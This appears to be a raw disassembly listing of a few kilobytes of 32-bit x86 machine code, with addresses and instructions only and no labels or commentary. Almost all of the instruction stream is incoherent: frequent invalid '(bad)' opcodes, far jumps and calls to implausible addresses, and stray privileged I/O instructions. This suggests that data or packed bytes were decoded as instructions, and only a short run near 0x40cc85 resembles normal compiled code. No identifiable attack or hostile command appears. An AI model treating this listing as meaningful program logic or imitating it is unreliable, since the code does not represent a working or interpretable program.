  40c98c:	rol    BYTE PTR [esi+0x4d09e5b8],0x75
  40c993:	pop    ebp
  40c994:	xor    al,BYTE PTR es:[ebp-0x48]
  40c998:	mov    ?,eax
  40c99a:	retf   
  40c99b:	rol    BYTE PTR [edx+edx*4-0x395fd0ef],0x31
  40c9a3:	and    BYTE PTR [ecx],al
  40c9a5:	retf   0x8773
  40c9a8:	pop    ecx
  40c9a9:	lock inc ebp
  40c9ab:	and    dl,BYTE PTR [ebx-0x410b6370]
  40c9b1:	cli    
  40c9b2:	pop    eax
  40c9b3:	(bad)  
  40c9b4:	jnp    0x40c992
  40c9b6:	mov    eax,0x6fb91d1d
  40c9bb:	jno    0x40c97b
  40c9bd:	out    dx,eax
  40c9be:	adc    al,0x60
  40c9c0:	sbb    bl,dh
  40c9c2:	push   ds
  40c9c3:	(bad)  
  40c9c5:	sub    eax,0xd67c32e1
  40c9ca:	pop    es
  40c9cb:	jnp    0x40c9d2
  40c9cd:	das    
  40c9ce:	sbb    ch,BYTE PTR [ebx-0x2362e1f]
  40c9d4:	out    0xf8,al
  40c9d6:	repz xor ebp,DWORD PTR [ebx]
  40c9d9:	jb     0x40c9ee
  40c9db:	loop   0x40c9b4
  40c9dd:	call   0x7db59d37
  40c9e2:	cwde   
  40c9e3:	xor    dl,dl
  40c9e5:	inc    ebp
  40c9e6:	sbb    eax,0xeeb3bb01
  40c9eb:	ins    BYTE PTR es:[edi],dx
  40c9ec:	int    0x2c
  40c9ee:	arpl   WORD PTR [edi],bx
  40c9f0:	shl    BYTE PTR [edx],1
  40c9f2:	mov    esi,0xe9dc912a
  40c9f7:	js     0x40c9b6
  40c9f9:	add    esi,edi
  40c9fb:	sbb    al,0x77
  40c9fd:	dec    ecx
  40c9fe:	retf   
  40c9ff:	mov    ebp,0xfdc872f6
  40ca04:	aam    0x10
  40ca06:	adc    DWORD PTR [ebx+0x23],0xffffffd8
  40ca0a:	das    
  40ca0b:	sub    BYTE PTR ss:[ecx],ah
  40ca0e:	push   ebp
  40ca0f:	mov    ebp,0xaaba2c89
  40ca14:	jg     0x40c9a8
  40ca16:	pop    esp
  40ca17:	jle    0x40ca0b
  40ca19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca1a:	mov    ecx,0xb77e2789
  40ca1f:	cdq    
  40ca20:	scas   al,BYTE PTR es:[edi]
  40ca21:	cli    
  40ca22:	aaa    
  40ca23:	loop   0x40ca0c
  40ca25:	sbb    eax,DWORD PTR [edi-0x6b]
  40ca28:	ds mov dl,0x79
  40ca2b:	pop    eax
  40ca2c:	cmc    
  40ca2d:	xchg   ah,ch
  40ca2f:	cmc    
  40ca30:	rcr    DWORD PTR [esi],0x44
  40ca33:	sub    ch,ah
  40ca35:	call   0x98ac149c
  40ca3a:	jno    0x40c9d8
  40ca3c:	cmp    eax,0xb31c609e
  40ca41:	dec    edx
  40ca42:	mov    al,0xfc
  40ca44:	jno    0x40ca4e
  40ca46:	pushf  
  40ca47:	js     0x40ca08
  40ca49:	mov    al,0xa7
  40ca4b:	in     al,dx
  40ca4c:	loop   0x40c9e6
  40ca4e:	cwde   
  40ca4f:	(bad)  
  40ca50:	or     eax,0x3cab2172
  40ca55:	jle    0x40ca98
  40ca57:	xchg   ebp,eax
  40ca58:	mov    bl,0xad
  40ca5a:	cmc    
  40ca5b:	repz or al,0x36
  40ca5e:	fs clc 
  40ca60:	cwde   
  40ca61:	mov    ecx,0x9b2db92a
  40ca66:	xor    al,0x4a
  40ca68:	into   
  40ca69:	jbe    0x40cae3
  40ca6b:	push   eax
  40ca6c:	xchg   DWORD PTR ds:0x13bcf416,ecx
  40ca72:	test   BYTE PTR [esi],al
  40ca74:	imul   ecx,edx,0x7b
  40ca77:	cli    
  40ca78:	in     eax,0x59
  40ca7a:	or     BYTE PTR [edi],0xb
  40ca7d:	xchg   esi,eax
  40ca7e:	push   0x2c
  40ca80:	xor    edx,edi
  40ca82:	add    BYTE PTR [edx-0x77],0xa8
  40ca86:	(bad)  
  40ca87:	fcmove st,st(2)
  40ca89:	and    esp,DWORD PTR [edx+0x776de150]
  40ca8f:	fist   DWORD PTR [eax]
  40ca91:	aas    
  40ca92:	mov    al,ds:0xb032f9cb
  40ca97:	fcmovbe st,st(5)
  40ca99:	inc    edx
  40ca9a:	cwde   
  40ca9b:	aad    0xa3
  40ca9d:	cld    
  40ca9e:	xor    ebp,esp
  40caa0:	adc    al,0xb1
  40caa2:	fistp  QWORD PTR [ebx]
  40caa4:	mov    dh,0xe
  40caa6:	mov    al,0xa0
  40caa8:	jne    0x40ca44
  40caaa:	sar    DWORD PTR [ecx-0x15b52c53],0x10
  40cab1:	lock stc 
  40cab3:	sub    BYTE PTR [edi+ecx*8-0x47],0x5f
  40cab8:	test   DWORD PTR [ecx],esi
  40caba:	jmp    0x47176c5d
  40cabf:	sub    dh,bh
  40cac1:	mov    edi,0x39d849a0
  40cac6:	scas   eax,DWORD PTR es:[edi]
  40cac7:	xor    ch,BYTE PTR [eax]
  40cac9:	mov    al,ds:0x4a880b86
  40cace:	lahf   
  40cacf:	push   ebx
  40cad0:	mov    dl,0xb2
  40cad2:	xchg   DWORD PTR ds:0x339ec8c8,esi
  40cad8:	ret    
  40cad9:	inc    ecx
  40cada:	jmp    0x40ca93
  40cadc:	jecxz  0x40ca89
  40cade:	ja     0x40cb5e
  40cae0:	mov    cl,0xf7
  40cae2:	ss jl  0x40caea
  40cae5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cae7:	popf   
  40cae8:	sbb    al,0xa7
  40caea:	ret    
  40caeb:	add    DWORD PTR [edi+0x6f6f5c14],ecx
  40caf1:	test   DWORD PTR [edi+0x36eec017],esp
  40caf7:	inc    ebp
  40caf8:	leave  
  40caf9:	fs pop ebx
  40cafb:	fldenv ds:0x5aa5235f
  40cb01:	lods   eax,DWORD PTR ds:[esi]
  40cb02:	test   BYTE PTR [edx],dl
  40cb04:	jo     0x40cb65
  40cb06:	jmp    0xf1a92554
  40cb0b:	scas   al,BYTE PTR es:[edi]
  40cb0c:	mov    ebx,0x686ad767
  40cb11:	daa    
  40cb12:	xchg   edx,eax
  40cb13:	das    
  40cb14:	lds    edi,FWORD PTR [ebp+0x6d269818]
  40cb1a:	int3   
  40cb1b:	mov    edi,DWORD PTR ds:0x9fd82a16
  40cb21:	sbb    ah,BYTE PTR [edx-0x2656e6fa]
  40cb27:	mov    ch,0x7d
  40cb29:	mov    eax,ds:0x3650d882
  40cb2e:	xlat   BYTE PTR ds:[ebx]
  40cb2f:	mov    ds:0xdca331c7,al
  40cb34:	lea    esi,[ecx]
  40cb36:	ins    BYTE PTR es:[edi],dx
  40cb37:	pusha  
  40cb38:	cmp    esp,ecx
  40cb3a:	xchg   BYTE PTR [ebx+edi*4],ch
  40cb3d:	in     al,dx
  40cb3e:	dec    ebp
  40cb3f:	or     dl,BYTE PTR [esi-0x5a593d59]
  40cb45:	call   0x89a9cc11
  40cb4a:	bound  ecx,QWORD PTR [ebx-0x58f067ee]
  40cb50:	rcl    DWORD PTR [ebp+0x79],0xac
  40cb54:	lods   al,BYTE PTR ds:[esi]
  40cb55:	loop   0x40cb16
  40cb57:	sub    eax,0x23159328
  40cb5c:	add    bh,BYTE PTR [edi+ebp*1-0x9e0e8eb]
  40cb63:	(bad)  
  40cb64:	es sbb cl,ah
  40cb67:	push   esi
  40cb68:	sbb    cl,dl
  40cb6a:	popf   
  40cb6b:	test   DWORD PTR [ecx-0x257c96bc],eax
  40cb71:	(bad)  
  40cb73:	sbb    al,0xb9
  40cb75:	or     DWORD PTR [esi+0x394df84a],ebx
  40cb7b:	retf   
  40cb7c:	mov    bh,0x7d
  40cb7e:	dec    edx
  40cb7f:	dec    DWORD PTR [ecx]
  40cb81:	test   eax,0x27986879
  40cb86:	add    al,0x5b
  40cb88:	mov    dh,cl
  40cb8a:	js     0x40cb3e
  40cb8c:	call   0xa1da8720
  40cb91:	ins    DWORD PTR es:[edi],dx
  40cb92:	mov    BYTE PTR [esi-0x3f3a7b67],0xd4
  40cb99:	rcr    BYTE PTR [esi-0x215d5fa1],1
  40cb9f:	inc    edx
  40cba0:	pop    ds
  40cba1:	bound  ebp,QWORD PTR [ecx+ecx*8]
  40cba4:	push   ecx
  40cba5:	inc    ebp
  40cba6:	mov    ecx,0xc216473
  40cbab:	mov    al,ds:0xeaae97d8
  40cbb0:	mov    dl,BYTE PTR [edx-0x25]
  40cbb3:	out    0x81,eax
  40cbb5:	(bad)  
  40cbb6:	and    BYTE PTR [eax+0x7ee49cfd],dl
  40cbbc:	out    dx,eax
  40cbbd:	mov    edx,0xba7fde7b
  40cbc2:	xor    eax,0xab30a9b6
  40cbc7:	mov    eax,ds:0x80a61004
  40cbcc:	inc    edi
  40cbcd:	call   0xdb14a052
  40cbd2:	sar    DWORD PTR [ecx+eax*8+0x26],0x3e
  40cbd7:	fs push edx
  40cbd9:	jmp    0xe4b6:0x686a7e7e
  40cbe0:	sub    ebx,eax
  40cbe2:	in     al,0x8
  40cbe4:	jo     0x40cb93
  40cbe6:	sbb    BYTE PTR [esi],al
  40cbe8:	push   0x2e
  40cbea:	jmp    0x6221:0xf988ef5c
  40cbf1:	and    eax,esi
  40cbf3:	ss xchg ebx,eax
  40cbf5:	stos   DWORD PTR es:[edi],eax
  40cbf6:	or     eax,0xbc13e06b
  40cbfb:	inc    edx
  40cbfc:	cmp    ebp,DWORD PTR [edx+eax*1]
  40cbff:	or     bl,BYTE PTR [ebx+0x30]
  40cc02:	or     BYTE PTR [eax],bh
  40cc04:	xchg   BYTE PTR [edi+ebp*1+0x73],bh
  40cc08:	and    ecx,esp
  40cc0a:	fadd   QWORD PTR [ebx+eiz*1-0xf]
  40cc0e:	out    0xaf,al
  40cc10:	int3   
  40cc11:	sub    BYTE PTR [esi-0x5d],dl
  40cc14:	fs pusha 
  40cc16:	stos   DWORD PTR es:[edi],eax
  40cc17:	inc    ebx
  40cc18:	inc    eax
  40cc19:	frstor [ecx]
  40cc1b:	or     al,0x71
  40cc1d:	or     eax,0xfbf06d2a
  40cc22:	js     0x40cc53
  40cc24:	mov    ecx,0x94499120
  40cc29:	push   ecx
  40cc2a:	sahf   
  40cc2b:	call   0xe4707a70
  40cc30:	fstp   QWORD PTR [ebx-0x77]
  40cc33:	push   esi
  40cc34:	nop    DWORD PTR [ecx+ebx*2-0x79]
  40cc39:	cmp    eax,0xb7a45333
  40cc3e:	bound  ecx,QWORD PTR [edi]
  40cc40:	std    
  40cc41:	lods   eax,DWORD PTR ds:[esi]
  40cc42:	ret    
  40cc43:	xchg   BYTE PTR [eax-0x43],dl
  40cc46:	xor    eax,0x2ae7c1d0
  40cc4b:	mov    ebx,0xdbe5ef53
  40cc50:	ror    DWORD PTR [ebx-0x2a],1
  40cc53:	scas   eax,DWORD PTR es:[edi]
  40cc54:	ja     0x40cc73
  40cc56:	push   edx
  40cc57:	dec    ecx
  40cc58:	imul   eax,DWORD PTR ds:0x3b643fd6,0x1705da0c
  40cc62:	fwait
  40cc63:	ror    BYTE PTR [edi-0x5b],cl
  40cc66:	out    0xdb,al
  40cc68:	mov    gs,WORD PTR [eax-0x14]
  40cc6b:	leave  
  40cc6c:	inc    eax
  40cc6d:	ins    BYTE PTR es:[edi],dx
  40cc6e:	sub    al,0x24
  40cc70:	inc    esi
  40cc71:	pop    ecx
  40cc72:	in     al,0x2a
  40cc74:	mov    BYTE PTR [edx-0x2febfd5e],dl
  40cc7a:	mov    ebp,0x5167371e
  40cc7f:	dec    esi
  40cc80:	cmpps  xmm5,XMMWORD PTR [ecx+0x2b],0xd8
  40cc85:	add    edx,ecx
  40cc87:	add    edi,ecx
  40cc89:	imul   edx,edi
  40cc8c:	add    edx,DWORD PTR [ebp-0x14]
  40cc8f:	mov    DWORD PTR [ebp-0x14],edx
  40cc92:	mov    edx,DWORD PTR [ebp-0xc]
  40cc95:	jmp    0x40d008
  40cc9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc9b:	loopne 0x40cc38
  40cc9d:	mov    ebx,0xe364435b
  40cca2:	mov    ecx,DWORD PTR [esi]
  40cca4:	pop    eax
  40cca5:	push   es
  40cca6:	mov    dh,0x6a
  40cca8:	xor    dh,BYTE PTR [ebp+0x7c7c923b]
  40ccae:	retf   0x7c79
  40ccb1:	jl     0x40cc63
  40ccb3:	adc    DWORD PTR [ebp+0x1f],ebx
  40ccb6:	lock mov bh,0x9
  40ccb9:	add    al,0x2e
  40ccbb:	(bad)  
  40ccbc:	dec    esi
  40ccbd:	lds    eax,FWORD PTR [eax]
  40ccbf:	jns    0x40cd28
  40ccc1:	retf   0x1490
  40ccc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccc5:	std    
  40ccc6:	frstor [esi+0x38]
  40ccc9:	test   al,0x70
  40cccb:	push   cs
  40cccc:	inc    esi
  40cccd:	xchg   ax,ax
  40cccf:	sbb    eax,0x540e0f97
  40ccd4:	push   ss
  40ccd5:	add    DWORD PTR [edx+0x14],0x566dfa51
  40ccdc:	call   0xd74d55b4
  40cce1:	(bad)  
  40cce2:	jnp    0x40ccd5
  40cce4:	stc    
  40cce5:	pusha  
  40cce6:	mov    ah,0x56
  40cce8:	and    BYTE PTR [eax],dh
  40ccea:	xchg   ebx,eax
  40cceb:	mov    ebx,0x2251c4d4
  40ccf0:	cld    
  40ccf1:	xchg   ebx,eax
  40ccf2:	inc    ebp
  40ccf3:	cdq    
  40ccf4:	sub    bl,dh
  40ccf6:	ja     0x40cc98
  40ccf8:	scas   eax,DWORD PTR es:[edi]
  40ccf9:	cmp    cl,dh
  40ccfb:	add    BYTE PTR [edx],ch
  40ccfd:	xchg   ebx,eax
  40ccfe:	mov    ds:0x7dbd52ac,al
  40cd03:	lds    ecx,FWORD PTR [eax-0x689e399]
  40cd09:	bound  ecx,QWORD PTR [esi+0x4fa04204]
  40cd0f:	mov    dh,0x30
  40cd11:	or     dh,ch
  40cd13:	or     al,dh
  40cd15:	cmp    al,0x20
  40cd17:	and    al,0x24
  40cd19:	repz xchg ecx,eax
  40cd1b:	fimul  WORD PTR [edi+eax*2+0x247e10ce]
  40cd22:	stos   BYTE PTR es:[edi],al
  40cd23:	add    BYTE PTR [eax-0x4e],0xb2
  40cd27:	inc    esp
  40cd28:	lds    ebp,FWORD PTR [edx]
  40cd2a:	add    BYTE PTR [esi+ebx*4-0x334e2f09],0x1c
  40cd32:	fisubr WORD PTR [eax-0x60]
  40cd35:	cmp    ebp,DWORD PTR [edi]
  40cd37:	jo     0x40cd8e
  40cd39:	cmp    eax,0x160f3368
  40cd3e:	jl     0x40cdbd
  40cd40:	enter  0xfec5,0x49
  40cd44:	mov    es,WORD PTR [edi]
  40cd46:	fldenv [ecx]
  40cd48:	jmp    0x5fcb:0xe970b804
  40cd4f:	sub    cl,dl
  40cd51:	lods   al,BYTE PTR ds:[esi]
  40cd52:	out    dx,eax
  40cd53:	pop    es
  40cd54:	lock scas eax,DWORD PTR es:[edi]
  40cd56:	fs sbb al,0xa2
  40cd59:	mov    ch,BYTE PTR [eax-0x594239da]
  40cd5f:	push   esi
  40cd60:	(bad)  [ebx+0x45]
  40cd63:	or     eax,0x1a041220
  40cd68:	sbb    ah,dh
  40cd6a:	sbb    eax,DWORD PTR [ecx]
  40cd6c:	sub    eax,0x615e533
  40cd71:	mov    cl,dl
  40cd73:	mov    eax,0x3d80ac02
  40cd78:	scas   eax,DWORD PTR es:[edi]
  40cd79:	daa    
  40cd7a:	jbe    0x40cdeb
  40cd7c:	jmp    0x1856fd36
  40cd81:	fidivr DWORD PTR [eax-0x32]
  40cd84:	push   edi
  40cd85:	adc    BYTE PTR [eax],al
  40cd87:	js     0x40cdc8
  40cd89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd8a:	push   sp
  40cd8c:	mov    bh,0xf8
  40cd8e:	(bad)  
  40cd8f:	jne    0x40cde3
  40cd91:	sti    
  40cd92:	jg     0x40cdaa
  40cd94:	xchg   edi,eax
  40cd95:	ins    BYTE PTR es:[edi],dx
  40cd96:	cld    
  40cd97:	fwait
  40cd98:	scas   al,BYTE PTR es:[edi]
  40cd99:	shl    ch,cl
  40cd9b:	xchg   edx,eax
  40cd9c:	scas   eax,DWORD PTR es:[edi]
  40cd9d:	cli    
  40cd9e:	cmp    edx,DWORD PTR [esi+0x30]
  40cda1:	idiv   BYTE PTR ds:0x20cf00af
  40cda7:	pushf  
  40cda8:	push   ebx
  40cda9:	int    0xf3
  40cdab:	je     0x40cdb2
  40cdad:	lods   al,BYTE PTR ds:[esi]
  40cdae:	pop    ebx
  40cdaf:	dec    esp
  40cdb0:	mov    ds:0xa76d62eb,al
  40cdb5:	cmp    esp,DWORD PTR [ecx-0x7b9b9c7e]
  40cdbb:	in     al,0x72
  40cdbd:	sar    ebx,0x62
  40cdc0:	dec    ebx
  40cdc1:	or     ax,0x8513
  40cdc5:	xchg   DWORD PTR [edi-0x6d8f08c4],ebx
  40cdcb:	jecxz  0x40ce0c
  40cdcd:	retf   0xbb16
  40cdd0:	mov    ebx,0x377fb31
  40cdd5:	mov    gs,WORD PTR [edx+0x2f]
  40cdd8:	sub    BYTE PTR [edx+0x1940ca25],al
  40cdde:	push   edx
  40cddf:	mov    al,0x86
  40cde1:	cmp    BYTE PTR [edx+0xe97b582],al
  40cde7:	fwait
  40cde8:	sbb    eax,0xc095c3ed
  40cded:	test   al,0x2c
  40cdef:	jb     0x40ce22
  40cdf1:	sbb    eax,0x2c0b15db
  40cdf6:	std    
  40cdf7:	rcpps  xmm7,XMMWORD PTR [ebp+0x4721ce1b]
  40cdfe:	pop    esi
  40cdff:	ret    
  40ce00:	shl    DWORD PTR [edi+0x19695ccf],cl
  40ce06:	data16 mov ah,0xd9
  40ce09:	xchg   edx,eax
  40ce0a:	fst    DWORD PTR [esi-0x3771e874]
  40ce10:	ins    DWORD PTR es:[edi],dx
  40ce11:	adc    edi,ebp
  40ce13:	fnsave [edx+0x76]
  40ce16:	out    dx,al
  40ce17:	mov    ds:0x763f13c6,al
  40ce1c:	sbb    dh,al
  40ce1e:	adc    DWORD PTR [edx+edx*8-0x7],ebp
  40ce22:	out    dx,al
  40ce23:	dec    ebx
  40ce24:	cmp    dl,BYTE PTR [ebx+0xcdf0318]
  40ce2a:	mov    bh,0x6a
  40ce2c:	dec    ebx
  40ce2d:	sbb    al,0x34
  40ce2f:	adc    al,0x8d
  40ce31:	enter  0x60f4,0xd8
  40ce35:	xor    DWORD PTR [ecx+eax*8],0xa6687496
  40ce3c:	mov    edx,0x80816945
  40ce41:	mov    dh,0x72
  40ce43:	enter  0xdde0,0x8b
  40ce47:	scas   eax,DWORD PTR es:[edi]
  40ce48:	retf   
  40ce49:	nop
  40ce4a:	sbb    BYTE PTR [eax-0x63],al
  40ce4d:	sub    DWORD PTR [edx],ecx
  40ce4f:	adc    BYTE PTR [ecx],dh
  40ce51:	cld    
  40ce52:	js     0x40ceba
  40ce54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce55:	mov    dl,0x4d
  40ce57:	dec    edx
  40ce58:	pop    edx
  40ce59:	xor    dh,dh
  40ce5b:	and    esi,DWORD PTR [ebx+0x1e]
  40ce5e:	in     eax,0xb7
  40ce60:	cli    
  40ce61:	sub    cl,BYTE PTR ds:0x591a5eb6
  40ce67:	xor    BYTE PTR [ebp+0x6c],bl
  40ce6a:	ds sbb al,0x9f
  40ce6d:	jp     0x40ce06
  40ce6f:	mov    eax,ds:0xc0f892
  40ce74:	jecxz  0x40ced3
  40ce76:	push   cs
  40ce77:	add    DWORD PTR [esi+eiz*1+0x62424fc8],esi
  40ce7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce7f:	shl    esp,cl
  40ce81:	mov    eax,0x843df3b
  40ce86:	cs call 0xcabb818c
  40ce8c:	ret    
  40ce8d:	call   0x2825883e
  40ce92:	ja     0x40ce81
  40ce94:	into   
  40ce95:	popa   
  40ce96:	sbb    bl,dl
  40ce98:	cmp    eax,0xe98effe
  40ce9d:	and    ch,BYTE PTR [ebx+0x48725ba3]
  40cea3:	aad    0x74
  40cea5:	icebp  
  40cea6:	ror    DWORD PTR [eax+0x4e],0xa4
  40ceaa:	enter  0x61b9,0x81
  40ceae:	aaa    
  40ceaf:	shl    ebp,1
  40ceb1:	pop    ebp
  40ceb2:	sbb    ch,dh
  40ceb4:	pop    eax
  40ceb5:	mov    edi,0xaf6c1ab1
  40ceba:	dec    ecx
  40cebb:	add    eax,0xd3b20405
  40cec0:	xor    DWORD PTR [eax],0xa11d5fbc
  40cec6:	(bad)  
  40cec7:	lods   eax,DWORD PTR ds:[esi]
  40cec8:	jg     0x40cee7
  40ceca:	daa    
  40cecb:	and    dh,ch
  40cecd:	scas   al,BYTE PTR es:[edi]
  40cece:	into   
  40cecf:	or     eax,0xee49f15
  40ced4:	leave  
  40ced5:	(bad)  
  40ced6:	sbb    BYTE PTR [edx+eiz*1+0x5],dl
  40ceda:	mov    ds:0x1f0564fa,al
  40cedf:	sub    dl,0x21
  40cee2:	cmc    
  40cee3:	scas   al,BYTE PTR es:[edi]
  40cee4:	mov    bl,0x42
  40cee6:	and    BYTE PTR [ebx+ebx*8-0x66],al
  40ceea:	inc    ebx
  40ceeb:	cmp    al,0xa8
  40ceed:	inc    edx
  40ceee:	cmp    dl,BYTE PTR [ebx+0x2f]
  40cef1:	adc    BYTE PTR [ebp+esi*2-0x53852fd4],dh
  40cef8:	cdq    
  40cef9:	inc    edx
  40cefa:	std    
  40cefb:	shl    DWORD PTR [edi],0xfd
  40cefe:	push   cs
  40ceff:	(bad)  
  40cf01:	int    0x95
  40cf03:	sub    esi,edx
  40cf05:	test   BYTE PTR [edi+0x5999e764],ch
  40cf0b:	test   DWORD PTR [edx+0x10275edc],edx
  40cf11:	and    ecx,DWORD PTR [ecx+0x7beb638]
  40cf17:	jp     0x40cec1
  40cf19:	jle    0x40cef0
  40cf1b:	es xchg esi,eax
  40cf1d:	xor    DWORD PTR [edi],eax
  40cf1f:	nop
  40cf20:	imul   eax,DWORD PTR [ebx+0x34eaee6b],0xffffff93
  40cf27:	mov    bh,0xd7
  40cf29:	por    mm6,QWORD PTR cs:[esp+ebx*4-0x5d9041eb]
  40cf32:	loopne 0x40cef7
  40cf34:	(bad)  [eax+0x50]
  40cf37:	xlat   BYTE PTR ds:[ebx]
  40cf38:	adc    al,0x6f
  40cf3a:	xchg   esp,eax
  40cf3b:	jne    0x40cf5f
  40cf3d:	xchg   edx,eax
  40cf3e:	idiv   DWORD PTR [ecx+0x3f736466]
  40cf44:	jno    0x40ced1
  40cf46:	jmp    0x40cfa2
  40cf48:	adc    eax,0xb475440f
  40cf4d:	sahf   
  40cf4e:	mov    al,0xa4
  40cf50:	xchg   ch,dl
  40cf52:	lahf   
  40cf53:	xchg   esp,eax
  40cf54:	pop    DWORD PTR [eax+ecx*4]
  40cf57:	daa    
  40cf58:	add    esi,ebp
  40cf5a:	and    DWORD PTR [ebx-0x49],ecx
  40cf5d:	jne    0x40cee2
  40cf5f:	xor    BYTE PTR [ecx],bl
  40cf61:	inc    edi
  40cf62:	and    edi,DWORD PTR [esi-0x10]
  40cf65:	std    
  40cf66:	or     cl,BYTE PTR [esi+0x7d]
  40cf69:	add    ch,BYTE PTR [ebp-0x19]
  40cf6c:	popf   
  40cf6d:	scas   al,BYTE PTR es:[edi]
  40cf6e:	mov    edx,0xb652619
  40cf73:	xchg   ecx,eax
  40cf74:	dec    esp
  40cf75:	dec    edx
  40cf76:	xor    al,0x8c
  40cf78:	hlt    
  40cf79:	xor    DWORD PTR [edx],0xffffffe4
  40cf7c:	and    al,0xe2
  40cf7e:	lods   al,BYTE PTR ds:[esi]
  40cf7f:	dec    ebx
  40cf80:	push   ebp
  40cf81:	push   0xffffffc2
  40cf83:	loopne 0x40cf88
  40cf85:	dec    ebx
  40cf86:	shl    DWORD PTR [ecx],cl
  40cf88:	push   esp
  40cf89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf8a:	(bad)  
  40cf8b:	shl    DWORD PTR [eax],cl
  40cf8d:	xchg   ecx,eax
  40cf8e:	sub    eax,0x32e152c3
  40cf93:	cwde   
  40cf94:	cmp    al,0xa4
  40cf96:	inc    esp
  40cf97:	cvtdq2ps xmm1,xmm5
  40cf9a:	mov    ds:0xeebe4e12,eax
  40cf9f:	addr16 iret 
  40cfa1:	in     eax,0x36
  40cfa3:	mov    eax,0x58dc5f7f
  40cfa8:	ror    DWORD PTR [ecx+0x42],cl
  40cfab:	mov    ebp,0x10547e60
  40cfb0:	sub    ch,BYTE PTR [esi+0x35]
  40cfb3:	inc    ebp
  40cfb4:	or     eax,0xb95a3e04
  40cfb9:	sub    eax,0x882b02b0
  40cfbe:	xchg   DWORD PTR [ebx-0x2],edx
  40cfc1:	gs xchg edx,eax
  40cfc3:	xor    cl,BYTE PTR [ebx-0x7e3e18c0]
  40cfc9:	push   ss
  40cfca:	lock or eax,0x2fdcfde6
  40cfd0:	jp     0x40d038
  40cfd2:	aas    
  40cfd3:	repnz shl BYTE PTR [ebx-0x46b9852d],1
  40cfda:	or     al,0x2e
  40cfdc:	lods   al,BYTE PTR ds:[esi]
  40cfdd:	push   0xb6adddf7
  40cfe2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfe3:	or     DWORD PTR [eax],esp
  40cfe5:	(bad)  
  40cfe6:	test   eax,0xef5b08cb
  40cfeb:	sbb    al,0x0
  40cfed:	cmp    edi,DWORD PTR [eax]
  40cfef:	int    0x3e
  40cff1:	pop    esp
  40cff2:	sub    DWORD PTR [esi+0x68],ebx
  40cff5:	fsub   DWORD PTR [eax-0x7b]
  40cff8:	fld    TBYTE PTR [esi]
  40cffa:	sub    DWORD PTR [eax+0x5661cf4c],ebx
  40d000:	adc    eax,DWORD PTR [edi]
  40d002:	clc    
  40d003:	dec    ebp
  40d004:	pop    ebp
  40d005:	out    dx,eax
  40d006:	fisttp QWORD PTR [ebx+0x33dc7d8b]
  40d00c:	rol    BYTE PTR [ebx],1
  40d00e:	ror    DWORD PTR [edi],1
  40d010:	scas   eax,DWORD PTR es:[edi]
  40d011:	xlat   BYTE PTR ds:[ebx]
  40d012:	jmp    0x40d385
  40d017:	retf   
  40d018:	jo     0x40cff3
  40d01a:	or     ah,BYTE PTR [ecx-0x63]
  40d01d:	jmp    0x40d09c
  40d01f:	sahf   
  40d020:	xor    dl,dh
  40d022:	ins    BYTE PTR es:[edi],dx
  40d023:	ins    BYTE PTR es:[edi],dx
  40d024:	rcl    BYTE PTR [eax-0xf],1
  40d027:	xchg   ecx,eax
  40d028:	lahf   
  40d029:	jl     0x40d0a7
  40d02b:	retf   0x7c79
  40d02e:	jl     0x40cffe
  40d030:	fwait
  40d031:	test   bh,0x1b
  40d034:	(bad)
  40d039:	out    0x81,al
  40d03b:	ds push ebp
  40d03d:	cmp    al,0x96
  40d03f:	addr16 push edx
  40d041:	add    DWORD PTR [ebx-0x681c2dd5],eax
  40d047:	loop   0x40d05c
  40d049:	jns    0x40d015
  40d04b:	pop    ds
  40d04c:	syscall 
  40d04e:	mov    cl,0xf
  40d050:	and    bh,BYTE PTR [esp+ecx*8-0x13]
  40d054:	mov    esp,0x410d71c6
  40d059:	mov    ecx,0x8209d7d0
  40d05e:	inc    edx
  40d05f:	add    ch,BYTE PTR ds:0x669cbf65
  40d065:	test   BYTE PTR [esi+0x45],al
  40d068:	stos   BYTE PTR es:[edi],al
  40d069:	cmp    BYTE PTR [ebp-0x66e176cd],al
  40d06f:	pusha  
  40d070:	in     al,0xfc
  40d072:	outs   dx,BYTE PTR ds:[esi]
  40d073:	push   es
  40d074:	jmp    0x40d0a8
  40d076:	add    eax,DWORD PTR [ecx+0x63]
  40d079:	push   es
  40d07a:	jl     0x40d086
  40d07c:	ins    BYTE PTR es:[edi],dx
  40d07d:	cli    
  40d07e:	enter  0x903a,0x21
  40d082:	fdivr  QWORD PTR [eax+0x2d]
  40d085:	mov    bl,0xe2
  40d087:	xlat   BYTE PTR ds:[ebx]
  40d088:	mov    ebp,0x8daf9db3
  40d08d:	retf   
  40d08e:	(bad)  
  40d090:	pop    es
  40d091:	repz dec ecx
  40d093:	sbb    eax,0x926aa242
  40d098:	inc    esp
  40d099:	aas    
  40d09a:	scas   eax,DWORD PTR es:[edi]
  40d09b:	pop    ebp
  40d09c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d09d:	xchg   edi,eax
  40d09e:	mov    ebp,0xdc01ecde
  40d0a3:	lods   al,BYTE PTR ds:[esi]
  40d0a4:	(bad)  [eax-0x1ca146b6]
  40d0aa:	jnp    0x40d0ff
  40d0ac:	pop    esi
  40d0ad:	mov    ds:0x91882222,eax
  40d0b2:	in     eax,0xcb
  40d0b4:	and    ch,BYTE PTR [eax-0x13]
  40d0b7:	fyl2xp1 
  40d0b9:	dec    ebx
  40d0ba:	test   BYTE PTR [ecx],ah
  40d0bc:	add    ebp,DWORD PTR [eax+0x33b5eb37]
  40d0c2:	push   cs
  40d0c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0c4:	stos   BYTE PTR es:[edi],al
  40d0c5:	jge    0x40d0f1
  40d0c7:	retf   0xfbfd
  40d0ca:	enter  0x83e4,0x30
  40d0ce:	inc    ebx
  40d0cf:	hlt    
  40d0d0:	and    ebx,DWORD PTR [edi-0x2f]
  40d0d3:	pmulhw mm4,QWORD PTR [ebx-0x54cff62c]
  40d0da:	outs   dx,DWORD PTR ds:[esi]
